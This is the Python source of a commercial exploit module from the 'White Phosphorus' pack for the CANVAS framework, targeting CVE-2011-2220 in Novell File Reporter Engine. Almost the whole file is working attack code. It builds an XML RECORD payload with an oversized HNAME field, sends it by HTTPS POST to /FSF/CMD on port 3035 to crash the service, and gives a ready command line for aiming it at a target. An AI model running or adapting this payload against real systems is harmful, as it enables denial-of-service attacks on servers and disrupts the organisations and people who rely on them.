
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


# Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import ssl
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
import libs.spkproxy as spkproxy


######################################################################################
NAME = "Novell File Reporter Engine RECORD Element Remote Denial of Service"
DESCRIPTION = "Exploits a remote DOS in Novell File Reporter"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Novell'
DOCUMENTATION["Date public"] = "2011-01-13"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2011-2220"
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2220'
DOCUMENTATION['CVSS'] = 9.7
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-227/"
DOCUMENTATION["Notes"] = """
This module causes Denial of Service only - not remote code execution.

Remote code exec is prevented by a combination of Structured Exception Handling and
bad char filtering.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
WP> Novell File Reporter Engine RECORD Element Remote Denial of Service
-----------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)

Versions:
0: Windows Universal

Payloads:
0: DOS

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_novell_filereporter_record_dos/wp_novell_filereporter_record_dos.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 3035
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS=["DOS"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode() 

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):        
        payload = "DC702C7E4CF693E25D5967631DE2A35D<RECORD>"
        payload += "<NAME>SRA</NAME>"
        payload += "<VERSION>1</VERSION>"
        payload += "<OPERATION>8001</OPERATION>"
        payload += "<STATUS>0</STATUS>"
        payload += "<SERVERVERSION>1.0.3.22</SERVERVERSION>"
        payload += "<SERVERPLATFORM>2</SERVERPLATFORM>"
        payload += "<PROTOCOL>http</PROTOCOL>"
        payload += "<URL>" + self.host + ":0</URL>"
        payload += "<HNAME>" + wp_randomstring(4096) + "</HNAME>"
        payload += "</RECORD>"
        return payload


    def run(self):
        self.getArgs()
        
        payload = self.makesploit()
        self.result_error = 0
        
        try:
            useragentstring = "https://"+self.host+":%s"%self.port+"/"
            UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
            UA.clearHeaders()
            UA.addHeader("Content-Type","text/xml")
            UA.addHeader("Connection","close")
            
            self.log("WP> Sending Exploit")
            data = UA.POST("/FSF/CMD", payload, extraheaders=None, noresponse=True)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(8)
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

        